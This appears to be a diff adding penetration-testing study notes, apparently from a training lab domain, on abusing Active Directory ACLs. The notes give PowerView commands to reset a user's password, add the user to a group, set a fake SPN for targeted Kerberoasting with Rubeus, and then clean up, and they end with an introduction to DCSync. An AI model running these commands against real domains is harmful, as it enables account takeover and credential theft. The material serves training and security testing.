@@ -157,6 +157,121 @@ If we right-click on the line between the two objects, a menu will pop up. If we
 - Operational Security (Opsec) considerations
 - External references.
 
+# ACL Abuse Tactics
+
+- **Creating a PSCredential Object**
+```
+$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
+```
+- **Creating a SecureString Object**
+```
+$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+```
+- **Changing the User's Password**
+```
+Import-Module .\PowerView.ps1
+Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+```
+We could do this from a Linux attack host using a tool such as **`pth-net`**, which is part of the **pth-toolkit**.
+
+Reference: https://github.com/byt3bl33d3r/pth-toolkit
+
+- **Creating a SecureString Object using damundsen**
+```
+$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+```
+
+Next, we can use the `Add-DomainGroupMember` function to add ourselves to the target group. We can first confirm that our user is not a member of the target group. This could also be done from a Linux host using the `pth-toolkit`.
+
+- **Adding damundsen to the Help Desk Level 1 Group**
+```
+Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+```
+```
+Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+```
+- **Confirming damundsen was Added to the Group**
+```
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+```
+
+Since we have GenericAll rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's servicePrincipalName attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat. We can now use `Set-DomainObject` to create the fake SPN. We could use the tool `targetedKerberoast` to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.
+
+Reference: https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/
+
+Reference: https://github.com/ShutdownRepo/targetedKerberoast
+
+- **Creating a Fake SPN**
+```
+Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+```
+
+If this worked, we should be able to Kerberoast the user using any number of methods and obtain the hash for offline cracking. Let's do this with Rubeus.
+
+- **Kerberoasting with Rubeus**
+```
+.\Rubeus.exe kerberoast /user:adunn /nowrap
+```
+
+Great! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the adunn user and perform the DCSync attack, which we will cover in the next section.
+
+**Cleanup**
+1. Remove the fake SPN we created on the adunn user.
+2. Remove the damundsen user from the Help Desk Level 1 group
+3. Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user
+
+```
+# Removing the Fake SPN from adunn's Account
+Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+# Removing damundsen from the Help Desk Level 1 Group
+Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+# Confirming damundsen was Removed from the Group
+Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+```
+
+Reference: SDDL (Security Descriptor Definition Language) https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language. We can use the `ConvertFrom-SddlString` cmdlet to convert this to a readable format.
+
+If we choose to filter on the DiscretionaryAcl property, we can see that the modification was likely giving the mrb3n user GenericWrite privileges over the domain object itself, which could be indicative of an attack attempt.
+
+```
+ConvertFrom-SddlString "<SDDL_STRING_HERE>" |select -ExpandProperty DiscretionaryAcl
+```
+
+# DCSync
+
+DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
+
+The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.
+
+To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.
+
+Using Get-DomainUser to View adunn's Group Membership
+```
+Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
